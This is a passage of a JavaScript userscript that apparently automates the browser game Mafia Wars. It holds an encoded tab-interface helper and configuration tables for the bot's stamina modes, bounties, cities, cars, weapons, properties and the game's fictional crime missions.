    "PT1udWxsKT8gbnVsbCA6IHBhcnNlSW50KFJlZ0V4cC4kMSkgLy9yZXR1cm5zIG51bGwgb3IgaW5kZXgsIHdoZXJlIGluZGV4IChpbnQpIGlzIHRoZSBzZWxlY3RlZCB0YWIncyBpbmRleA0KCX0sDQoNCglleHBh" +
    "bmR0YWI6ZnVuY3Rpb24odGFicmVmKXsNCgkJdmFyIHN1YmNvbnRlbnRpZD10YWJyZWYuZ2V0QXR0cmlidXRlKCJyZWwiKSAvL0dldCBpZCBvZiBzdWJjb250ZW50IHRvIGV4cGFuZA0KCQkvL0dldCAicmV2IiBh" +
    "dHRyIGFzIGEgc3RyaW5nIG9mIElEcyBpbiB0aGUgZm9ybWF0ICIsam9obixnZW9yZ2UsdHJleSxldGMsIiB0byBlYXNpbHkgc2VhcmNoIHRocm91Z2gNCgkJdmFyIGFzc29jaWF0ZWRyZXZpZHM9KHRhYnJlZi5n" +
    "ZXRBdHRyaWJ1dGUoInJldiIpKT8gIiwiK3RhYnJlZi5nZXRBdHRyaWJ1dGUoInJldiIpLnJlcGxhY2UoL1xzKy8sICIiKSsiLCIgOiAiIg0KCQl0aGlzLmV4cGFuZHN1YmNvbnRlbnQoc3ViY29udGVudGlkKQ0K" +
    "CQl0aGlzLmV4cGFuZHJldmNvbnRlbnQoYXNzb2NpYXRlZHJldmlkcykNCgkJZm9yICh2YXIgaT0wOyBpPHRoaXMudGFicy5sZW5ndGg7IGkrKyl7IC8vTG9vcCB0aHJvdWdoIGFsbCB0YWJzLCBhbmQgYXNzaWdu" +
    "IG9ubHkgdGhlIHNlbGVjdGVkIHRhYiB0aGUgQ1NTIGNsYXNzICJzZWxlY3RlZCINCgkJCXRoaXMuZ2V0c2VsZWN0ZWRDbGFzc1RhcmdldCh0aGlzLnRhYnNbaV0pLmNsYXNzTmFtZT0odGhpcy50YWJzW2ldLmdl" +
    "dEF0dHJpYnV0ZSgicmVsIik9PXN1YmNvbnRlbnRpZCk/ICJzZWxlY3RlZCIgOiAiIg0KCQl9DQoJCWlmICh0aGlzLmVuYWJsZXRhYnBlcnNpc3RlbmNlKSAvL2lmIHBlcnNpc3RlbmNlIGVuYWJsZWQsIHNhdmUg" +
    "c2VsZWN0ZWQgdGFiIHBvc2l0aW9uKGludCkgcmVsYXRpdmUgdG8gaXRzIHBlZXJzDQoJCQlkZHRhYmNvbnRlbnQuc2V0Q29va2llKHRoaXMudGFiaW50ZXJmYWNlaWQsIHRhYnJlZi50YWJwb3NpdGlvbikNCgkJ" +
    "dGhpcy5zZXRjdXJyZW50dGFiaW5kZXgodGFicmVmLnRhYnBvc2l0aW9uKSAvL3JlbWVtYmVyIHBvc2l0aW9uIG9mIHNlbGVjdGVkIHRhYiB3aXRoaW4gaG90dGFic3Bvc2l0aW9uc1tdIGFycmF5DQoJfSwNCg0K" +
    "CWV4cGFuZHN1YmNvbnRlbnQ6ZnVuY3Rpb24oc3ViY29udGVudGlkKXsNCgkJZm9yICh2YXIgaT0wOyBpPHRoaXMuc3ViY29udGVudGlkcy5sZW5ndGg7IGkrKyl7DQoJCQl2YXIgc3ViY29udGVudD1kb2N1bWVu" +
    "dC5nZXRFbGVtZW50QnlJZCh0aGlzLnN1YmNvbnRlbnRpZHNbaV0pIC8vY2FjaGUgY3VycmVudCBzdWJjb250ZW50IG9iaiAoaW4gZm9yIGxvb3ApDQoJCQlzdWJjb250ZW50LnN0eWxlLmRpc3BsYXk9KHN1YmNv" +
    "bnRlbnQuaWQ9PXN1YmNvbnRlbnRpZCk/ICJibG9jayIgOiAibm9uZSIgLy8ic2hvdyIgb3IgaGlkZSBzdWIgY29udGVudCBiYXNlZCBvbiBtYXRjaGluZyBpZCBhdHRyIHZhbHVlDQoJCX0NCgl9LA0KDQoJZXhw" +
    "YW5kcmV2Y29udGVudDpmdW5jdGlvbihhc3NvY2lhdGVkcmV2aWRzKXsNCgkJdmFyIGFsbHJldmlkcz10aGlzLnJldmNvbnRlbnRpZHMNCgkJZm9yICh2YXIgaT0wOyBpPGFsbHJldmlkcy5sZW5ndGg7IGkrKyl7" +
    "IC8vTG9vcCB0aHJvdWdoIHJldiBhdHRyaWJ1dGVzIGZvciBhbGwgdGFicyBpbiB0aGlzIHRhYiBpbnRlcmZhY2UNCgkJCS8vaWYgYW55IHZhbHVlcyBzdG9yZWQgd2l0aGluIGFzc29jaWF0ZWRyZXZpZHMgbWF0" +
    "Y2hlcyBvbmUgd2l0aGluIGFsbHJldmlkcywgZXhwYW5kIHRoYXQgRElWLCBvdGhlcndpc2UsIGNvbnRyYWN0IGl0DQoJCQlkb2N1bWVudC5nZXRFbGVtZW50QnlJZChhbGxyZXZpZHNbaV0pLnN0eWxlLmRpc3Bs" +
    "YXk9KGFzc29jaWF0ZWRyZXZpZHMuaW5kZXhPZigiLCIrYWxscmV2aWRzW2ldKyIsIikhPS0xKT8gImJsb2NrIiA6ICJub25lIg0KCQl9DQoJfSwNCg0KCXNldGN1cnJlbnR0YWJpbmRleDpmdW5jdGlvbih0YWJw" +
    "b3NpdGlvbil7IC8vc3RvcmUgY3VycmVudCBwb3NpdGlvbiBvZiB0YWIgKHdpdGhpbiBob3R0YWJzcG9zaXRpb25zW10gYXJyYXkpDQoJCWZvciAodmFyIGk9MDsgaTx0aGlzLmhvdHRhYnNwb3NpdGlvbnMubGVu" +
    "Z3RoOyBpKyspew0KCQkJaWYgKHRhYnBvc2l0aW9uPT10aGlzLmhvdHRhYnNwb3NpdGlvbnNbaV0pew0KCQkJCXRoaXMuY3VycmVudFRhYkluZGV4PWkNCgkJCQlicmVhaw0KCQkJfQ0KCQl9DQoJfSwNCg0KCWF1" +
    "dG9ydW46ZnVuY3Rpb24oKXsgLy9mdW5jdGlvbiB0byBhdXRvIGN5Y2xlIHRocm91Z2ggYW5kIHNlbGVjdCB0YWJzIGJhc2VkIG9uIGEgc2V0IGludGVydmFsDQoJCXRoaXMuY3ljbGVpdCgnbmV4dCcsIHRydWUp" +
    "DQoJfSwNCg0KCWNhbmNlbGF1dG9ydW46ZnVuY3Rpb24oKXsNCgkJaWYgKHR5cGVvZiB0aGlzLmF1dG9ydW50aW1lciE9InVuZGVmaW5lZCIpDQoJCQljbGVhckludGVydmFsKHRoaXMuYXV0b3J1bnRpbWVyKQ0K" +
    "CX0sDQoNCglpbml0OmZ1bmN0aW9uKGF1dG9tb2RlcGVyaW9kKXsNCgkJdmFyIHBlcnNpc3RlZHRhYj1kZHRhYmNvbnRlbnQuZ2V0Q29va2llKHRoaXMudGFiaW50ZXJmYWNlaWQpIC8vZ2V0IHBvc2l0aW9uIG9m" +
    "IHBlcnNpc3RlZCB0YWIgKGFwcGxpY2FibGUgaWYgcGVyc2lzdGVuY2UgaXMgZW5hYmxlZCkNCgkJdmFyIHNlbGVjdGVkdGFiPS0xIC8vQ3VycmVudGx5IHNlbGVjdGVkIHRhYiBpbmRleCAoLTEgbWVhbmluZyBu" +
    "b25lKQ0KCQl2YXIgc2VsZWN0ZWR0YWJmcm9tdXJsPXRoaXMudXJscGFyYW1zZWxlY3QodGhpcy50YWJpbnRlcmZhY2VpZCkgLy9yZXR1cm5zIG51bGwgb3IgaW5kZXggZnJvbTogdGFiY29udGVudC5odG0/dGFi" +
    "aW50ZXJmYWNlaWQ9aW5kZXgNCgkJdGhpcy5hdXRvbW9kZXBlcmlvZD1hdXRvbW9kZXBlcmlvZCB8fCAwDQoJCWZvciAodmFyIGk9MDsgaTx0aGlzLnRhYnMubGVuZ3RoOyBpKyspew0KCQkJdGhpcy50YWJzW2ld" +
    "LnRhYnBvc2l0aW9uPWkgLy9yZW1lbWJlciBwb3NpdGlvbiBvZiB0YWIgcmVsYXRpdmUgdG8gaXRzIHBlZXJzDQoJCQlpZiAodGhpcy50YWJzW2ldLmdldEF0dHJpYnV0ZSgicmVsIikpew0KCQkJCXZhciB0YWJp" +
    "bnN0YW5jZT10aGlzDQoJCQkJdGhpcy5ob3R0YWJzcG9zaXRpb25zW3RoaXMuaG90dGFic3Bvc2l0aW9ucy5sZW5ndGhdPWkgLy9zdG9yZSBwb3NpdGlvbiBvZiAiaG90IiB0YWIgKCJyZWwiIGF0dHIgZGVmaW5l" +
    "ZCkgcmVsYXRpdmUgdG8gaXRzIHBlZXJzDQoJCQkJdGhpcy5zdWJjb250ZW50aWRzW3RoaXMuc3ViY29udGVudGlkcy5sZW5ndGhdPXRoaXMudGFic1tpXS5nZXRBdHRyaWJ1dGUoInJlbCIpIC8vc3RvcmUgaWQg" +
    "b2Ygc3ViIGNvbnRlbnQgKCJyZWwiIGF0dHIgdmFsdWUpDQoJCQkJdGhpcy50YWJzW2ldLm9uY2xpY2s9ZnVuY3Rpb24oKXsNCgkJCQkJdGFiaW5zdGFuY2UuZXhwYW5kdGFiKHRoaXMpDQoJCQkJCXRhYmluc3Rh" +
    "bmNlLmNhbmNlbGF1dG9ydW4oKSAvL3N0b3AgYXV0byBjeWNsaW5nIG9mIHRhYnMgKGlmIHJ1bm5pbmcpDQoJCQkJCXJldHVybiBmYWxzZQ0KCQkJCX0NCgkJCQlpZiAodGhpcy50YWJzW2ldLmdldEF0dHJpYnV0" +
    "ZSgicmV2IikpeyAvL2lmICJyZXYiIGF0dHIgZGVmaW5lZCwgc3RvcmUgZWFjaCB2YWx1ZSB3aXRoaW4gInJldiIgYXMgYW4gYXJyYXkgZWxlbWVudA0KCQkJCQl0aGlzLnJldmNvbnRlbnRpZHM9dGhpcy5yZXZj" +
    "b250ZW50aWRzLmNvbmNhdCh0aGlzLnRhYnNbaV0uZ2V0QXR0cmlidXRlKCJyZXYiKS5zcGxpdCgvXHMqLFxzKi8pKQ0KCQkJCX0NCgkJCQlpZiAoc2VsZWN0ZWR0YWJmcm9tdXJsPT1pIHx8IHRoaXMuZW5hYmxl" +
    "dGFicGVyc2lzdGVuY2UgJiYgc2VsZWN0ZWR0YWI9PS0xICYmIHBhcnNlSW50KHBlcnNpc3RlZHRhYik9PWkgfHwgIXRoaXMuZW5hYmxldGFicGVyc2lzdGVuY2UgJiYgc2VsZWN0ZWR0YWI9PS0xICYmIHRoaXMu" +
    "Z2V0c2VsZWN0ZWRDbGFzc1RhcmdldCh0aGlzLnRhYnNbaV0pLmNsYXNzTmFtZT09InNlbGVjdGVkIil7DQoJCQkJCXNlbGVjdGVkdGFiPWkgLy9TZWxlY3RlZCB0YWIgaW5kZXgsIGlmIGZvdW5kDQoJCQkJfQ0K" +
    "CQkJfQ0KCQl9IC8vRU5EIGZvciBsb29wDQoJCWlmIChzZWxlY3RlZHRhYiE9LTEpIC8vaWYgYSB2YWxpZCBkZWZhdWx0IHNlbGVjdGVkIHRhYiBpbmRleCBpcyBmb3VuZA0KCQkJdGhpcy5leHBhbmR0YWIodGhp" +
    "cy50YWJzW3NlbGVjdGVkdGFiXSkgLy9leHBhbmQgc2VsZWN0ZWQgdGFiIChlaXRoZXIgZnJvbSBVUkwgcGFyYW1ldGVyLCBwZXJzaXN0ZW50IGZlYXR1cmUsIG9yIGNsYXNzPSJzZWxlY3RlZCIgY2xhc3MpDQoJ" +
    "CWVsc2UgLy9pZiBubyB2YWxpZCBkZWZhdWx0IHNlbGVjdGVkIGluZGV4IGZvdW5kDQoJCQl0aGlzLmV4cGFuZHRhYih0aGlzLnRhYnNbdGhpcy5ob3R0YWJzcG9zaXRpb25zWzBdXSkgLy9KdXN0IHNlbGVjdCBm" +
    "aXJzdCB0YWIgdGhhdCBjb250YWlucyBhICJyZWwiIGF0dHINCgkJaWYgKHBhcnNlSW50KHRoaXMuYXV0b21vZGVwZXJpb2QpPjUwMCAmJiB0aGlzLmhvdHRhYnNwb3NpdGlvbnMubGVuZ3RoPjEpew0KCQkJdGhp" +
    "cy5hdXRvcnVudGltZXI9c2V0SW50ZXJ2YWwoZnVuY3Rpb24oKXt0YWJpbnN0YW5jZS5hdXRvcnVuKCl9LCB0aGlzLmF1dG9tb2RlcGVyaW9kKQ0KCQl9DQoJfSAvL0VORCBpbnQoKSBmdW5jdGlvbg0KDQp9IC8v" +
    "RU5EIFByb3RvdHlwZSBhc3NpZ25tZW50";

  var settingsOpen = false;
  var statsOpen = false;
  var scratchpad = document.createElement('textarea');
  var defaultClans = ['{', '[', '(', '<', '\u25C4', '�', '\u2122', '\u03A8', '\u039E'];
  var defaultPassPatterns = ['LOST', 'punched', 'Whacked', 'you were robbed', 'ticket'];
  var defaultFailPatterns = ['WON','heal','help','properties','upgraded'];
  var keyStr = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';

  var debug = isGMChecked('enableDebug');
  var filter = isGMChecked('filterLog');

  // Regular expression for cash matching.
  const REGEX_CASH = /[A-Z]?\$[\d,]*\d/;

  // Define how stamina can be used.
  const STAMINA_HOW_FIGHT_RANDOM = 0;  // Random fighting.
  const STAMINA_HOW_FIGHT_LIST   = 1;  // List fighting.
  const STAMINA_HOW_HITMAN       = 2;  // Hitman.
  const STAMINA_HOW_ROBBING      = 3;  // Robbing
  const STAMINA_HOW_AUTOHITLIST  = 4;  // Place bounties.
  const STAMINA_HOW_RANDOM       = 5;  // Random spending of stamina in random cities.
  const STAMINA_HOW_FIGHTROB     = 6;  // Fight then Rob random opponents.

  var staminaSpendChoices = [];
  staminaSpendChoices[STAMINA_HOW_FIGHT_RANDOM] = 'Fight random opponents';
  staminaSpendChoices[STAMINA_HOW_FIGHT_LIST]   = 'Fight specific opponents';
  staminaSpendChoices[STAMINA_HOW_HITMAN]       = 'Collect hitlist bounties';
  staminaSpendChoices[STAMINA_HOW_ROBBING]      = 'Rob random opponents';
  staminaSpendChoices[STAMINA_HOW_AUTOHITLIST]  = 'Place hitlist bounties';
  staminaSpendChoices[STAMINA_HOW_RANDOM]       = 'Spend stamina randomly';
  staminaSpendChoices[STAMINA_HOW_FIGHTROB]     = 'Fight then Rob';

  var randomSpendChoices = [];
  randomSpendChoices[STAMINA_HOW_FIGHT_RANDOM] = 'Fight random';
  randomSpendChoices[STAMINA_HOW_FIGHT_LIST]   = 'Fight specific';
  randomSpendChoices[STAMINA_HOW_HITMAN]       = 'Collect bounties';
  randomSpendChoices[STAMINA_HOW_ROBBING]      = 'Rob random';

  // Define Bounty Selection options
  const BOUNTY_SHORTEST_TIME  = 0;  // Select qualified bounties with shortest time.
  const BOUNTY_LONGEST_TIME   = 1;  // Select qualified bounties with longest time on the hitlist.
  const BOUNTY_HIGHEST_BOUNTY = 2;  // Select qualified bounties with the highest bounty.
  const BOUNTY_EXACT_AMOUNT   = 3;  // Select qualified bounties with exact dollar amount.
  const BOUNTY_RANDOM         = 4;  // Select random qualified bounty.
  var bountySelectionChoices = [];
  bountySelectionChoices[BOUNTY_SHORTEST_TIME]  = 'Shortest time';
  bountySelectionChoices[BOUNTY_LONGEST_TIME]   = 'Longest time';
  bountySelectionChoices[BOUNTY_HIGHEST_BOUNTY] = 'Highest bounty';
  bountySelectionChoices[BOUNTY_EXACT_AMOUNT]   = 'Exact dollar amount';
  bountySelectionChoices[BOUNTY_RANDOM]         = 'No preference (random)';

  // Define war modes
  const WAR_HOW_RANDOM = 0;  // Random war.
  const WAR_HOW_LIST   = 1;  // List warring
  var warModeChoices = ['War a random friend', 'War friends from a list'];

  // Define AutoStat allocation mode
  const AUTOSTAT_TARGET        = 0;
  const AUTOSTAT_RATIO_LEVEL   = 1;
  const AUTOSTAT_RATIO_ATTACK  = 2;
  const AUTOSTAT_RATIO_DEFENSE = 3;
  const AUTOSTAT_RATIO_HEALTH  = 4;
  const AUTOSTAT_RATIO_ENERGY  = 5;
  const AUTOSTAT_RATIO_STAMINA = 6;

  // Auto Stat mode arrays
  var autoStatDescrips  = ['Level', 'Attack', 'Defense', 'Health', 'Energy', 'Stamina'];
  var autoStatModes     = ['autoStatAttackMode', 'autoStatDefenseMode', 'autoStatHealthMode',
                           'autoStatEnergyMode', 'autoStatStaminaMode'];
  var autoStatPrios     = ['autoStatAttackPrio', 'autoStatDefensePrio', 'autoStatHealthPrio',
                           'autoStatEnergyPrio', 'autoStatStaminaPrio'];
  var autoStatFallbacks = ['autoStatAttackFallback', 'autoStatDefenseFallback', 'autoStatHealthFallback',
                           'autoStatEnergyFallback', 'autoStatStaminaFallback'];
  var autoStatBases     = ['autoStatAttackBase', 'autoStatDefenseBase', 'autoStatHealthBase',
                           'autoStatEnergyBase', 'autoStatStaminaBase'];
  var autoStatRatios    = ['autoStatAttackRatio', 'autoStatDefenseRatio', 'autoStatHealthRatio',
                           'autoStatEnergyRatio', 'autoStatStaminaRatio'];

  // Number Scheme
  const SCHEME_PERCENT = 0;
  const SCHEME_POINTS = 1;

  var numberSchemes = ['percent','points'];

  // Stamina Burst constants
  const BURST_WIN    = 0;
  const BURST_ALWAYS = 1;
  var burstModes = ['ONLY if won','ALWAYS'];

  // Burn constants
  const BURN_ENERGY = 0;
  const BURN_STAMINA = 1;
  var burnModes = ['Energy','Stamina'];

  // Array of lottery bonus items
  var autoLottoBonusList = ['A random collection item', 'A free ticket', '+5 stamina points', '1 Godfather point', '+20 energy points', '1-5 Godfather points'];

  // Prop Income
  var propsData = new Array (
    // Name, income per level per hour
    ['Louie\'s Deli', 250],
    ['Flophouse', 300],
    ['Pawnshop', 700],
    ['Tenement', 5000],
    ['Warehouse', 10000],
    ['Restaurant', 12000],
    ['Dockyard', 50000],
    ['Office Park', 150000],
    ['Uptown Hotel', 200000],
    ['Mega Casino', 300000]
// close above and open below to trick script into buying casino's
//    ['Mega Casino',   300000000]
  );

  // Stat Ordinal constants
  const ATTACK_STAT  = 0;
  const DEFENSE_STAT = 1;
  const HEALTH_STAT  = 2;
  const ENERGY_STAT  = 3;
  const STAMINA_STAT = 4;

  // Define city variables.
  const NY      = 0;
  const CUBA    = 1;
  const MOSCOW  = 2;
  const BANGKOK = 3;
  const LV      = 4;
  const ACTIVE_CITY = 5;
  const RANDOM_CITY = 6;

  // Constants to access city attributes
  const CITY_NAME        = 0;
  const CITY_ALIAS       = 1;
  const CITY_SIDES       = 2;
  const CITY_SIDE_NAME   = 3;
  const CITY_CASH        = 4;
  const CITY_LEVEL       = 5;
  const CITY_CASH_ICON   = 6;
  const CITY_CASH_CSS    = 7;
  const CITY_AUTOBANK    = 8;
  const CITY_BANKCONFG   = 9;
  const CITY_CASH_SYMBOL = 10;
  const CITY_ALLIANCE    = 11;

  // Constants for accessing mission array
  const MISSION_NAME     = 0; // 7
  const MISSION_ENERGY   = 1; // 5
  const MISSION_NUMBER   = 2; // 4
  const MISSION_TAB      = 3; // 2
  const MISSION_CITY     = 4; // 1
  const MISSION_XP       = 5; // 6
  const MISSION_TABPATH  = 6; // 3
  const MISSION_NODE_LV  = 7; // 0 node line for Las Vegas
  const MISSION_RATIO    = 8; // 8

  // Add city variables in this format
  // Name, Alias, Sides (if any), Cash, Level Req, Icon, Icon CSS, Autobank config, Min cash config, Sell Crates config, Cash Symbol, Alliance Point Threshold
  // Array container for city variables
  var cities = new Array(
    ['New York', 'nyc', [], 'sideNY', undefined, 0, cashIcon, 'cash Icon', 'autoBank', 'bankConfig', '$', 0],
    ['Cuba', 'cuba', [], 'sideCuba', undefined, 35, cashCubaIcon, 'cashCuba Icon', 'autoBankCuba', 'bankConfigCuba', 'C$', 0],
    ['Moscow', 'moscow', ['Vory','Mafiya'], 'sideMoscow', undefined, 70, cashMoscowIcon, 'cashMoscow Icon', 'autoBankMoscow', 'bankConfigMoscow', 'R$', 0],
    ['Bangkok', 'bangkok', ['Yakuza','Triad'], 'sideBangkok', undefined, 18, cashBangkokIcon, 'cashBangkok Icon', 'autoBankBangkok', 'bankConfigBangkok', 'B$', 50],
    ['Las Vegas', 'vegas', [], 'sideVegas', undefined, 0, cashVegasIcon, 'cashVegas Icon', 'autoBankVegas', 'bankConfigVegas', 'V$', 0]
  );

  var locations = ['New York','Cuba','Moscow','Bangkok','Las Vegas','Active City'];
  var fightLocations = ['New York','Cuba','Moscow','Bangkok','Las Vegas','Active City', 'Random City'];
  var randomLocations = ['New York','Cuba','Moscow','Bangkok','Las Vegas'];

  // Featured job locations
  var featJobNames = ['Left Job', 'Middle Job', 'Right Job'];

  var allyFaction = '';
  var quickBankFail = false;

  // Cars
  var cityCars = new Array (
    ['Sonic Five', 25, 'Requires 12 car parts | 32 attack, 30 defense'],
    ['Random Common Car', 1, 'Requires 10 car parts'],
    ['General Ulysses', 26, 'Requires 28 car parts| 38 attack, 28 defense'],
    ['Random Rare Car', 2, 'Requires 25 car parts'],
    ['Tasmanian', 3, 'Requires 30 car parts | 36 attack, 34 defense'],
    ['CM Santiago R10', 4, 'Requires 30 car parts, 2 cuban car parts | 42 attack, 30 defense'],
    ['Sirroco 9Z', 11, 'Requires 48 car parts | 46 attack, 15 defense'],
    ['Rebel 2', 5, 'Requires 45 car parts, 1 bulletproof glass | 40 attack, 45 defense, +5 stamina'],
    ['Russian Dazatz 45', 6, 'Requires 50 car parts, 2 russian car parts | 18 attack, 46 defense'],
    ['Solar Flare', 7, 'Requires 65 car parts, 1 solar panel | 34 attack, 34 defense, +5 energy'],
    ['Andresen 420si', 12, 'Requires 68 car parts | 41 attack, 43 defense'],
    ['Thai XS Max', 8, 'Requires 75 car parts, 2 Thai car parts | 45 attack, 35 defense'],
    ['Trio Napoli', 9, 'Requires 95 car parts | 47 attack, 23 defense'],
    ['Red Angel', 10, 'Requires 115 car parts | 16 attack, 49 defense'],
    ['Mugati Sport', 13, 'Requires 135 car parts, 1 high tech car part | 35 attack, 51 defense, +3 attack'],
    ['Hunter \'Spy\' XS', 14, 'Requires 155 car parts, 2 high tech car parts | 52 attack, 29 defense, +3 defense'],
    ['Day Rider 2K', 27, 'Requires 175 car parts, 1 suspension coil | 45 attack, 50 defense, +1 attack, +1 defense']
  );

  // Weapons build
  var cityWeapons = new Array (
    ['Random Common Weapon', 15, 'Requires 1 weapon parts'],
    ['Random Uncommon Weapon', 16, 'Requires 3 weapon parts'],
    ['Random Rare Weapon', 17, 'Requires 5 weapon parts'],
    ['Ninja Sai', 18, 'Requires 30 weapon parts | 30 attack, 40 defense'],
    ['First Blood', 19, 'Requires 8 weapon parts and 1 explosive arrow | 49 attack, 13 defense'],
    ['Ultrasonic Gun', 20, 'Requires 12 weapon parts and 1 sonic emitter | 22 attack, 48 defense'],
    ['Lazer Guided RPG', 21, 'Requires 21 weapon parts and 1 laser rangefinder | 37 attack, 42 defense'],
    ['Robber\'s Utility Belt', 22, 'Requires 24 weapon parts, 1 boomerang and 1 grapple | 33 attack, 41 defense, +6 stamina'],
    ['Railgun', 23, 'Requires 27 weapon parts and 1 railgun barrel | 51 attack, 24 defense, +5 attack'],
    ['Plasma Rifle', 24, 'Requires 55 weapon parts and 1 portable fusion reactor | 40 attack, 47 defense, +5 defense']
  );

  // Las Vegas vault levels
  var vaultLevels = new Array (
    ['Vault handling disabled', 0],
    ['0.5 stars (V$100,000)', 100000],
    ['1.0 stars (V$200,000)', 200000],
    ['1.5 stars (V$400,000)', 400000],
    ['2.0 stars (V$800,000)', 800000],
    ['2.5 stars (V$1,500,000)', 1500000],
    ['3.0 stars (V$3,000,000)', 3000000],
    ['3.5 stars (V$5,000,000)', 5000000],
    ['4.0 stars (V$10,000,000)', 10000000],
    ['4.5 stars (V$20,000,000)', 20000000],
    ['5.0 stars (V$50,000,000)', 50000000]
  );

  // Flash Check
  const FLASH_UNDEFINED = -1;
  const FLASH_ENABLED = 1;
  const FLASH_DISABLED = 0;
  var isFlashed = FLASH_UNDEFINED;

  // Gift Accept Choices/Rewards
  var giftAcceptChoices = ['Help', 'Sabotage'];
  var giftAcceptRewards = ['XP', 'Energy', 'Stamina'];

  // Spend objects
  var SpendStamina = new Spend ('Stamina', 'staminaSpend', 'useStaminaStarted',
                                'selectStaminaKeepMode', 'selectStaminaKeep',
                                'selectStaminaUseMode', 'selectStaminaUse', staminaIcon,
                                'allowStaminaToLevelUp', 'staminaFloorLast', 'staminaCeilingLast');
  var SpendEnergy  = new Spend ('Energy', 'autoMission', 'useEnergyStarted',
                                'selectEnergyKeepMode', 'selectEnergyKeep',
                                'selectEnergyUseMode', 'selectEnergyUse', energyIcon,
                                'allowEnergyToLevelUp', 'energyFloorLast', 'energyCeilingLast');

  // Force Heal options
  var healOptions = new Array(
    ['forceHealOpt7','Heal if Health is above 19','check to allow healing while health is above 19, Overrides ALL Lower Settings'],
    ['forceHealOpt5','Heal after 5 minutes','if health drops below 20, start a 5 minute timer, Then allow healing'],
    ['forceHealOpt4','Heal if stamina is full','allow healing if stamina is full and not blocked from above choices'],
    ['forceHealOpt3','Heal if stamina can be spent','try to heal. overridden by the top 2 choices']
  );

  // Define all jobs. The array elements are:
  // job description0, energy cost1, job number2, tab number3, city4, exp payout5, tabpath6, lvnode7, ratio8
  var missions = new Array(
//     7                                                    5   4 2    1      6 3    0     8 //
    ['Chase Away Thugs'                                  ,  1,  1,1,NY     ,  1,0,'     '],
    ['Rob a Drug Runner'                                 ,  3,  2,1,NY     ,  3,0,'     '],
    ['Rough Up Dealers'                                  ,  5,  3,1,NY     ,  5,0,'     '],
    ['Rob the Warehouse'                                 ,  7,  4,1,NY     ,  8,0,'     '],
    ['Collect Protection Money'                          ,  2,  5,1,NY     ,  2,0,'     '],
    ['Grow Your Family'                                  ,  3,  8,1,NY     ,  3,0,'     '],
    ['Perform a Hit'                                     ,  2, 37,1,NY     ,  2,0,'     '],
    ['Mugging'                                           ,  2,  6,2,NY     ,  2,0,'     '],
    ['Auto Theft'                                        ,  2,  7,2,NY     ,  2,0,'     '],
    ['Take Out a Rogue Cop'                              ,  3,  9,2,NY     ,  3,0,'     '],
    ['Collect on a Loan'                                 ,  3, 10,2,NY     ,  3,0,'     '],
    ['Bank Heist'                                        , 10, 11,2,NY     , 13,0,'     '],
    ['Jewelry Store Job'                                 , 15, 12,2,NY     , 20,0,'     '],
    ['Hijack a Semi'                                     ,  8, 38,2,NY     ,  9,0,'     '],
    ['Destroy Enemy Mob Hideout'                         ,  5, 13,3,NY     ,  5,0,'     '],
    ['Kill a Protected Snitch'                           ,  5, 14,3,NY     ,  5,0,'     '],
    ['Bust a Made Man Out of Prison'                     ,  5, 15,3,NY     ,  5,0,'     '],
    ['Asian Museum Break-in'                             , 18, 16,3,NY     , 22,0,'     '],
    ['Fight a Haitian Gang'                              ,  6, 17,3,NY     ,  6,0,'     '],
    ['Clip the Irish Mob\'s Local Enforcer'              , 10, 39,3,NY     , 11,0,'     '],
    ['Steal a Tanker Truck'                              ,  8, 40,3,NY     ,  9,0,'     '],
    ['Federal Reserve Raid'                              , 25, 18,4,NY     , 30,0,'     '],
    ['Smuggle Thai Gems'                                 ,  7, 19,4,NY     ,  8,0,'     '],
    ['Liquor Smuggling'                                  , 30, 22,4,NY     , 35,0,'     '],
    ['Run Illegal Poker Game'                            , 20, 26,4,NY     , 33,0,'     '],
    ['Wiretap the Cops'                                  , 30, 28,4,NY     , 45,0,'     '],
    ['Rob an Electronics Store'                          , 24, 41,4,NY     , 26,0,'     '],
    ['Burn Down a Tenement'                              , 18, 42,4,NY     , 22,0,'     '],
    ['Distill Some Liquor'                               , 10, 23,4,NY     , 12,0,'     '],
    ['Manufacture Tokens'                                , 10, 24,4,NY     , 12,0,'     '],
    ['Get Cheating Deck'                                 , 10, 25,4,NY     , 12,0,'     '],
    ['Overtake Phone Central'                            , 10, 27,4,NY     , 12,0,'     '],
    ['Repel the Yakuza'                                  , 13, 29,5,NY     , 18,0,'     '],
    ['Disrupt Rival Smuggling Ring'                      , 15, 30,5,NY     , 20,0,'     '],
    ['Invade Tong-controlled Neighborhood'               , 25, 31,5,NY     , 30,0,'     '],
    ['Sell Guns to the Russian Mob'                      , 25, 32,5,NY     , 35,0,'     '],
    ['Protect your City against a Rival Family'          , 35, 33,5,NY     , 50,0,'     '],
    ['Assassinate a Political Figure'                    , 35, 34,5,NY     , 50,0,'     '],
    ['Exterminate a Rival Family'                        , 40, 35,5,NY     , 58,0,'     '],
    ['Obtain Compromising Photos'                        , 28, 43,5,NY     , 32,0,'     '],
    ['Frame a Rival Capo'                                , 26, 44,5,NY     , 33,0,'     '],
    ['Steal an Air Freight Delivery'                     , 32, 45,6,NY     , 36,0,'     '],
    ['Run a Biker Gang Out of Town'                      , 35, 46,6,NY     , 40,0,'     '],
    ['Flip a Snitch'                                     , 25, 47,6,NY     , 30,0,'     '],
    ['Steal Bank Records'                                , 30, 48,6,NY     , 36,0,'     '],
    ['Loot the Police Impound Lot'                       , 60, 49,6,NY     , 60,0,'     '],
    ['Recruit a Rival Crew Member'                       , 30, 50,6,NY     , 39,0,'     '],
    ['Dodge an FBI Tail'                                 , 20, 51,6,NY     , 27,0,'     '],
    ['Whack a Rival Crew Leader'                         , 28, 52,6,NY     , 38,0,'     '],
    ['Influence a Harbor Official'                       , 50, 53,7,NY     , 65,0,'     '],
    ['Move Stolen Merchandise'                           , 36, 54,7,NY     , 50,0,'     '],
    ['Snuff a Rat'                                       , 44, 55,7,NY     , 62,0,'     '],
    ['Help a Fugitive Flee the Country'                  , 40, 56,7,NY     , 57,0,'     '],
    ['Dispose of a Body'                                 , 25, 57,7,NY     , 36,0,'     '],
    ['Ransom a Businessman\'s Kids'                      , 60, 58,7,NY     , 70,0,'     '],
    ['Fix the Big Game'                                  , 50, 59,7,NY     , 60,0,'     '],
    ['Steal an Arms Shipment'                            , 45, 60,7,NY     , 66,0,'     '],
    ['Extort a Corrupt Judge'                            , 24, 61,8,NY     , 36,0,'     '],
    ['Embezzle Funds Through a Phony Company'            , 50, 62,8,NY     , 70,0,'     '],
    ['Break Into the Armory'                             , 50, 63,8,NY     , 60,0,'     '],
